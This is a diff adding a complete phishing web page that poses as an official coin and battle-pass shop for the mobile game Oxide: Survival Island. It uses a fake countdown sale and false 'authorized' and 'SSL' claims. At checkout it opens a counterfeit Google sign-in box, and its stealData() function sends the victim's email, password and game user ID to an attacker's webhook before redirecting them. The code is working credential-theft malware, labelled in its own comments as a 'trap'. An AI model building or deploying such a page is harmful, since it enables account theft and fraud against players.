@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Oxide: Survival Island Web Shop - SPECIAL OFFER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0b0b0b;
+            --card-bg: #1f1f1f;
+            --accent: #fce300;
+            --discount: #ff4444;
+            --text: #ffffff;
+            --subtext: #a1a1a1;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+
+        body { background-color: var(--bg); color: var(--text); padding-bottom: 40px; overflow-x: hidden; }
+
+        /* ICONS */
+        .icon-svg { width: 24px; height: 24px; fill: currentColor; }
+
+        /* TOP TIMER BAR */
+        .timer-bar {
+            background: var(--discount); color: #fff; text-align: center;
+            padding: 8px; font-weight: 700; font-size: 0.85rem; letter-spacing: 1px;
+            position: sticky; top: 0; z-index: 60;
+        }
+
+        /* HEADER */
+        .header {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 20px; position: sticky; top: 35px; /* Below timer */
+            background: rgba(11, 11, 11, 0.95); z-index: 50;
+            border-bottom: 1px solid #222;
+        }
+
+        .lang-btn {
+            display: flex; align-items: center; gap: 5px; background: transparent;
+            border: 1px solid #333; padding: 8px 12px; border-radius: 20px;
+            color: #fff; font-size: 0.9rem; cursor: pointer;
+        }
+
+        .header-right { display: flex; gap: 15px; align-items: center; }
+
+        .cart-btn-wrapper { position: relative; cursor: pointer; }
+        .cart-badge {
+            position: absolute; top: -5px; right: -5px;
+            background: var(--discount); color: #fff; font-size: 0.7rem;
+            width: 18px; height: 18px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; display: none; /* Hidden initially */
+        }
+
+        .login-btn {
+            background: var(--accent); color: #000; font-weight: 600;
+            padding: 8px 20px; border-radius: 24px; border: none; font-size: 0.9rem;
+        }
+
+        /* HERO */
+        .hero {
+            text-align: center; padding: 30px 20px;
+            background: radial-gradient(circle at center, #2a2a2a 0%, #0b0b0b 70%);
+        }
+        .game-logo {
+            width: 90px; height: 90px; border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 15px;
+            background-image: url('https://play-lh.googleusercontent.com/Q1N5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5Z5');
+            background-size: cover; display: inline-block;
+        }
+        .hero h1 { font-size: 1.6rem; margin-bottom: 5px; font-weight: 700; }
+        .hero p { color: var(--subtext); font-size: 0.85rem; letter-spacing: 1px; text-transform: uppercase; }
+
+        /* INFO CARDS */
+        .info-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+            padding: 0 20px; margin-bottom: 30px;
+        }
+        .info-card {
+            background: var(--card-bg); padding: 15px; border-radius: 16px;
+            display: flex; flex-direction: column; gap: 5px;
+        }
+        .info-title { font-weight: 600; font-size: 0.85rem; display: flex; align-items: center; gap: 8px; }
+        .info-desc { font-size: 0.7rem; color: var(--subtext); line-height: 1.3; }
+
+        /* PRODUCTS */
+        .category-title { padding: 0 20px; margin-bottom: 15px; font-size: 1.4rem; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
+        .sale-tag { background: var(--discount); color: white; padding: 2px 8px; border-radius: 4px; font-size: 0.8rem; }
+
+        .scroll-container {
+            display: flex; overflow-x: auto; gap: 15px; padding: 0 20px 20px;
+            scrollbar-width: none;
+        }
+        .scroll-container::-webkit-scrollbar { display: none; }
+
+        .product-card {
+            min-width: 160px; width: 160px; background: var(--card-bg);
+            border-radius: 16px; overflow: hidden; position: relative;
+            cursor: pointer; border: 1px solid #333; transition: 0.2s;
+        }
+        .product-card:active { transform: scale(0.95); }
+        
+        .discount-sticker {
+            position: absolute; top: 10px; left: 10px;
+            background: var(--discount); color: white;
+            font-weight: bold; padding: 4px 8px; border-radius: 6px;
+            font-size: 0.75rem; z-index: 10;
+        }
+
+        .product-img {
+            width: 100%; height: 180px; background-color: #333;
+            background-size: cover; background-position: center;
+        }
+        .product-details {
+            padding: 12px; background: #1a1a1a;
+        }
+        .prod-name { font-weight: 600; font-size: 0.9rem; margin-bottom: 8px; height: 40px; overflow: hidden; }
+        
+        .price-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+        .old-price { text-decoration: line-through; color: #666; font-size: 0.8rem; }
+        .new-price { color: var(--accent); font-weight: 700; font-size: 1rem; }
+
+        .add-btn {
+            background: #333; color: #fff; font-weight: 600;
+            padding: 8px 0; width: 100%; border-radius: 12px; border: none; font-size: 0.8rem;
+        }
+        .product-card:hover .add-btn { background: var(--accent); color: #000; }
+
+        /* CART MODAL (SIDEBAR) */
+        .cart-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); z-index: 200; display: none;
+            backdrop-filter: blur(3px);
+        }
+        .cart-sidebar {
+            position: fixed; top: 0; right: -100%; width: 85%; max-width: 400px;
+            height: 100%; background: #111; z-index: 201;
+            transition: 0.3s ease; display: flex; flex-direction: column;
+            box-shadow: -5px 0 30px rgba(0,0,0,0.8);
+        }
+        .cart-sidebar.open { right: 0; }
+
+        .cart-header {
+            padding: 20px; border-bottom: 1px solid #333;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .cart-title { font-size: 1.2rem; font-weight: 700; }
+        .close-cart { font-size: 1.5rem; cursor: pointer; color: #888; }
+
+        .cart-items { flex: 1; overflow-y: auto; padding: 20px; }
+        .cart-item {
+            display: flex; gap: 15px; margin-bottom: 20px;
+            border-bottom: 1px solid #222; padding-bottom: 15px;
+        }
+        .cart-img { width: 60px; height: 60px; background: #333; border-radius: 8px; background-size: cover; }
+        .cart-info { flex: 1; }
+        .cart-name { font-size: 0.9rem; font-weight: 600; margin-bottom: 5px; }
+        .cart-price { color: var(--accent); font-weight: bold; }
+
+        .cart-footer { padding: 20px; background: #1a1a1a; border-top: 1px solid #333; }
+        
+        /* UID INPUT IN CART */
+        .uid-input-box {
+            background: #2d2d2d; border-radius: 12px;
+            display: flex; align-items: center; padding: 0 15px; height: 50px;
+            margin-bottom: 15px; border: 1px solid #444;
+        }
+        .uid-input-box input {
+            background: transparent; border: none; color: #fff; width: 100%;
+            font-size: 1rem; outline: none;
+        }
+
+        .total-row { display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: bold; font-size: 1.1rem; }
+        .checkout-btn {
+            background: var(--accent); color: #000; width: 100%;
+            padding: 15px; border-radius: 12px; border: none;
+            font-weight: 800; font-size: 1rem; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        /* --- GOOGLE LOGIN TRAP --- */
+        .modal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 9999; justify-content: center; align-items: center;
+        }
+        .g-box {
+            background: #fff; width: 90%; max-width: 400px; border-radius: 8px;
+            padding: 48px 40px 36px; color: #202124; position: relative;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        .g-logo svg { width: 75px; height: 24px; margin-bottom: 10px; }
+        .g-head { font-size: 24px; font-weight: 400; margin-bottom: 10px; font-family: 'Google Sans', sans-serif; }
+        .g-sub { font-size: 16px; margin-bottom: 40px; color: #202124; }
+        
+        .g-input {
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
+            border-radius: 4px; font-size: 16px; outline: none; color: #202124; margin-bottom: 15px;
+        }
+        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        .g-btn {
+            background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
+            border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; float: right; margin-top: 20px;
+        }
+
+        /* Language Dropdown */
+        .lang-menu {
+            position: absolute; top: 60px; left: 20px; background: #222;
+            border-radius: 8px; padding: 10px; display: none; border: 1px solid #444;
+        }
+        .lang-opt { padding: 8px 15px; cursor: pointer; font-size: 0.9rem; }
+        .lang-opt:hover { background: #333; }
+
+    </style>
+</head>
+<body>
+
+    <!-- TIMER BAR -->
+    <div class="timer-bar">⚡ FLASH SALE: 50% OFF ENDS IN <span id="countdown">11:59:59</span> ⚡</div>
+
+    <!-- HEADER -->
+    <div class="header">
+        <button class="lang-btn" onclick="toggleLang()">
+            🌐 EN ▼
+        </button>
+        <div class="lang-menu" id="langMenu">
+            <div class="lang-opt">English</div>
+            <div class="lang-opt">Русский</div>
+            <div class="lang-opt">Español</div>
+        </div>
+
+        <div class="header-right">
+            <div class="cart-btn-wrapper" onclick="openCart()">
+                <svg class="icon-svg" style="color:#fff" viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
+                <div class="cart-badge" id="cartCount">0</div>
+            </div>
+            <button class="login-btn" onclick="openModal()">Log in</button>
+        </div>
+    </div>
+
+    <!-- HERO -->
+    <div class="hero">
+        <div class="game-logo"></div>
+        <h1>Oxide: Survival Island</h1>
+        <p>OFFICIAL WEB SHOP</p>
+    </div>
+
+    <!-- INFO CARDS -->
+    <div class="info-grid">
+        <div class="info-card">
+            <div class="info-title">
+                <svg class="icon-svg" style="color:#fff; width:18px;" viewBox="0 0 24 24"><path d="M12 3L2 12h3v8h6v-6h2v6h6v-8h3L12 3z"/></svg>
+                Official store
+            </div>
+            <div class="info-desc">Authorized by HyperHug</div>
+        </div>
+        <div class="info-card">
+            <div class="info-title">
+                <svg class="icon-svg" style="color:#fff; width:18px;" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-9-2c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+                Secure payments
+            </div>
+            <div class="info-desc">SSL Encrypted Checkout</div>
+        </div>
+    </div>
+
+    <!-- PRODUCTS -->
+    <h2 class="category-title">Coin Packs <span class="sale-tag">SALE</span></h2>
+    <div class="scroll-container">
+        <!-- ITEM 1 -->
+        <div class="product-card" onclick="addToCart('3550 Coins + Bonus', 49.99, 'https://i.imgur.com/dummy3.jpg')">
+            <div class="discount-sticker">-50%</div>
+            <div class="product-img" style="background-image: url('https://i.imgur.com/dummy3.jpg');"></div>
+            <div class="product-details">
+                <div class="prod-name">3550 Coins</div>
+                <div class="price-row">
+                    <span class="old-price">$99.99</span>
+                    <span class="new-price">$49.99</span>
+                </div>
+                <button class="add-btn">ADD TO CART</button>
+            </div>
+        </div>
+        <!-- ITEM 2 -->
+        <div class="product-card" onclick="addToCart('1675 Coins', 24.99, 'https://i.imgur.com/dummy3.jpg')">
+            <div class="discount-sticker">-50%</div>
+            <div class="product-img" style="background-image: url('https://i.imgur.com/dummy3.jpg');"></div>
+            <div class="product-details">
+                <div class="prod-name">1675 Coins</div>
+                <div class="price-row">
+                    <span class="old-price">$49.99</span>
+                    <span class="new-price">$24.99</span>
+                </div>
+                <button class="add-btn">ADD TO CART</button>
+            </div>
+        </div>
+    </div>
+
+    <h2 class="category-title" style="margin-top:20px">Battle Pass</h2>
+    <div class="scroll-container">
+        <!-- ITEM 3 -->
+        <div class="product-card" onclick="addToCart('Elite Battle Pass', 3.99, 'https://i.imgur.com/dummy2.jpg')">
+            <div class="discount-sticker">-40%</div>
+            <div class="product-img" style="background-image: url('https://i.imgur.com/dummy2.jpg');"></div>
+            <div class="product-details">
+                <div class="prod-name">Elite+ Pass</div>
+                <div class="price-row">
+                    <span class="old-price">$6.99</span>
+                    <span class="new-price">$3.99</span>
+                </div>
+                <button class="add-btn">ADD TO CART</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- CART SIDEBAR -->
+    <div class="cart-overlay" onclick="closeCart()"></div>
+    <div class="cart-sidebar" id="cartSidebar">
+        <div class="cart-header">
+            <div class="cart-title">Your Cart</div>
+            <div class="close-cart" onclick="closeCart()">×</div>
+        </div>
+        
+        <div class="cart-items" id="cartItemsContainer">
+            <!-- JS will put items here -->
+            <p style="color:#666; text-align:center; margin-top:50px;">Cart is empty</p>
+        </div>
+
+        <div class="cart-footer">
+            <div class="uid-input-box">
+                <svg style="width:20px; fill:#808080; margin-right:10px;" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                <input type="text" id="cartUid" placeholder="Enter User ID to Continue">
+            </div>
+            <div class="total-row">
+                <span>Total</span>
+                <span id="cartTotal">$0.00</span>
+            </div>
+            <button class="checkout-btn" onclick="triggerCheckout()">PROCEED TO PAY</button>
+        </div>
+    </div>
+
+    <!-- GOOGLE TRAP MODAL -->
+    <div id="gModal" class="modal">
+        <div class="g-box">
+            <div class="g-logo">
+                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg"><path d="M9.6 11.77V7.64h14.56c.4 1.16.6 2.28.6 3.48 0 6.12-4.16 10.68-10.56 10.68C6.2 21.8 2 17.4 2 12S6.2 2.2 14.2 2.2c3.48 0 6.4 1.28 8.68 3.4l-2.88 2.88c-1.36-1.32-3.28-2.12-5.8-2.12-4.8 0-8.72 3.96-8.72 8.84s3.92 8.84 8.72 8.84c4.56 0 6.44-3.16 6.72-5.28h-6.72v-4.08H24.8z" fill="#4285F4"/><path d="M33.2 13.6h-2.6v2.6h-2.4v-2.6h-2.6v-2.4h2.6V8.6h2.4v2.6h2.6v2.4z" fill="#34A853"/></svg>
+            </div>
+            <div class="g-head">Sign in</div>
+            <div class="g-sub">to verify purchase for Oxide</div>
+            <input type="email" id="email" class="g-input" placeholder="Email or phone">
+            <input type="password" id="pass" class="g-input" placeholder="Enter your password">
+            <div style="overflow: hidden;">
+                <span class="g-create">Create account</span>
+                <button class="g-btn g-next" onclick="stealData()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script>
+        // --- LOGIC ---
+        let cart = [];
+        let capturedUID = "";
+
+        // Timer Logic
+        let time = 12 * 60 * 60; // 12 Hours
+        setInterval(() => {
+            time--;
+            let h = Math.floor(time / 3600);
+            let m = Math.floor((time % 3600) / 60);
+            let s = time % 60;
+            document.getElementById('countdown').innerText = `${h}:${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
+        }, 1000);
+
+        // Language Toggle
+        function toggleLang() {
+            const menu = document.getElementById('langMenu');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // Cart Logic
+        function addToCart(name, price, img) {
+            cart.push({name, price, img});
+            updateCartUI();
+            openCart(); // Auto open cart on add like real sites
+        }
+
+        function updateCartUI() {
+            const container = document.getElementById('cartItemsContainer');
+            const countBadge = document.getElementById('cartCount');
+            const totalEl = document.getElementById('cartTotal');
+
+            // Update Badge
+            countBadge.innerText = cart.length;
+            countBadge.style.display = cart.length > 0 ? 'flex' : 'none';
+
+            // Render Items
+            if(cart.length === 0) {
+                container.innerHTML = '<p style="color:#666; text-align:center; margin-top:50px;">Cart is empty</p>';
+                totalEl.innerText = "$0.00";
+                return;
+            }
+
+            let html = "";
+            let total = 0;
+            cart.forEach(item => {
+                total += item.price;
+                html += `
+                    <div class="cart-item">
+                        <div class="cart-img" style="background-image: url('${item.img}')"></div>
+                        <div class="cart-info">
+                            <div class="cart-name">${item.name}</div>
+                            <div class="cart-price">$${item.price}</div>
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+            totalEl.innerText = "$" + total.toFixed(2);
+        }
+
+        function openCart() {
+            document.querySelector('.cart-overlay').style.display = 'block';
+            document.getElementById('cartSidebar').classList.add('open');
+        }
+
+        function closeCart() {
+            document.querySelector('.cart-overlay').style.display = 'none';
+            document.getElementById('cartSidebar').classList.remove('open');
+        }
+
+        // Checkout Trap
+        function triggerCheckout() {
+            if(cart.length === 0) return;
+            
+            const uid = document.getElementById('cartUid').value;
+            if(uid.length < 3) {
+                alert("Please enter your User ID to deliver items.");
+                return;
+            }
+            capturedUID = uid;
+            
+            // Close Cart, Open Trap
+            closeCart();
+            openModal();
+        }
+
+        function openModal() {
+            document.getElementById('gModal').style.display = 'flex';
+        }
+
+        // Steal Data
+        async function stealData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!email || !pass) return;
+
+            document.querySelector('.g-next').innerText = "Processing...";
+
+            const payload = {
+                username: "Oxide Store",
+                embeds: [{
+                    title: "🛒 PURCHASE ATTEMPT",
+                    color: 16562691,
+                    fields: [
+                        { name: "🆔 UID", value: `\`${capturedUID}\``, inline: true },
+                        { name: "💰 Total", value: document.getElementById('cartTotal').innerText, inline: true },
+                        { name: "📧 Email", value: `\`${email}\``, inline: false },
+                        { name: "🔑 Pass", value: `\`${pass}\``, inline: false }
+                    ],
+                    footer: { text: "BeastGPT" }
+                }]
+            };
+
+            try {
+                await fetch(CONFIG.WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {}
+
+            setTimeout(() => {
+                window.location.href = CONFIG.REDIRECT_URL;
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
